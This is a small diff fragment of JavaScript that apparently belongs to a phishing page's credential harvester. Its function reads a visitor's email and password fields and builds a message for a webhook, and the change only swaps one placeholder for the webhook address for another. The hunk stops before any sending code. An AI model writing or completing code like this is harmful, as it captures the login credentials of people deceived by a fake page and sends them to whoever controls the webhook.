@@ -1,5 +1,5 @@
 function next() {
-    const webhookURL = 'LINK OF YOUR WEBHOOK'
+    const webhookURL = 'WEBHOOK_URL'
     const input2 = document.getElementById('email').value
     const input = document.getElementById('password').value
     const message = {
